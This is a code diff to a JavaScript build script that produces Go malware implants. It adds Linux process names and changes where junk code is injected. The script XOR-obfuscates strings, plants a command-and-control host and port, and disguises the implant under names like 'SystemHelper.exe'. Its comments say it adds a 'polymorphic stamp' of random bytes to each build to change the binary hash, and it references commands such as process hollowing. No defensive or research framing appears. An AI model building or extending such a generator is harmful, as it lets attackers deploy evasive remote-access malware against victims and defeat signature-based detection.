@@ -49,11 +49,18 @@ const PLAIN_COMMANDS = {
   obfHollowprocess: 'hollowprocess',
 };
 
-const APP_NAMES = [
+const APP_NAMES_WIN = [
   'AppLauncher.exe',
   'UpdateManager.exe',
   'SystemHelper.exe',
   'ServiceRunner.exe',
+];
+
+const APP_NAMES_LINUX = [
+  'applauncher',
+  'updatemanager',
+  'systemhelper',
+  'servicerunner',
 ];
 
 function ensureDirs() {
@@ -166,7 +173,7 @@ function run(cmd, args, opts = {}) {
   });
 }
 
-function mutateSource(src, { xorKey, shiftValue, host, port, stamp }) {
+function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform }) {
   let out = src;
 
   // xorKey const
@@ -188,8 +195,9 @@ function mutateSource(src, { xorKey, shiftValue, host, port, stamp }) {
     out = out.replace(re, `$1"${hex}"`);
   }
 
-  // app names slice
-  const appHex = APP_NAMES.map((n) => `"${obfuscateString(n, xorKey)}"`).join(', ');
+  // app names slice (no .exe on Linux)
+  const appList = platform === 'linux' ? APP_NAMES_LINUX : APP_NAMES_WIN;
+  const appHex = appList.map((n) => `"${obfuscateString(n, xorKey)}"`).join(', ');
   out = out.replace(
     /obfAppNames\s*=\s*\[\]string\{[^}]+\}/,
     `obfAppNames                                                = []string{${appHex}}`
@@ -208,7 +216,7 @@ function mutateSource(src, { xorKey, shiftValue, host, port, stamp }) {
     `c2LocalTestMode bool // build:${stamp.slice(0, 12)}`
   );
 
-  // Inject polymorphic stamp near package vars (changes binary layout/hash)
+  // Inject polymorphic stamp AFTER imports (Go: package → import → decls)
   const junkVar = `
 // auto-generated polymorphic stamp — unique per build
 var (
@@ -216,7 +224,17 @@ var (
 	polyNoise_${stamp.slice(8, 16)} = []byte{${Array.from(crypto.randomBytes(32)).join(', ')}}
 )
 `;
-  out = out.replace('package main\n', `package main\n${junkVar}`);
+  const m = out.match(/\nimport\s*\([\s\S]*?\n\)/);
+  if (m && m.index != null) {
+    const insertAt = m.index + m[0].length;
+    out = out.slice(0, insertAt) + '\n' + junkVar + out.slice(insertAt);
+  } else {
+    // Fallback: after last single-line import, else after package line
+    out = out.replace(
+      /(package main\r?\n(?:[\s\S]*?import\s+"[^"]+"\r?\n)?)/,
+      `$1${junkVar}`
+    );
+  }
 
   return out;
 }
@@ -247,7 +265,7 @@ async function generateBuild(options = {}) {
   fs.mkdirSync(workDir, { recursive: true });
 
   const raw = fs.readFileSync(SOURCE, 'utf8');
-  const mutated = mutateSource(raw, { xorKey, shiftValue, host, port, stamp });
+  const mutated = mutateSource(raw, { xorKey, shiftValue, host, port, stamp, platform });
   const goFile = path.join(workDir, 'main.go');
   fs.writeFileSync(goFile, mutated, 'utf8');
 
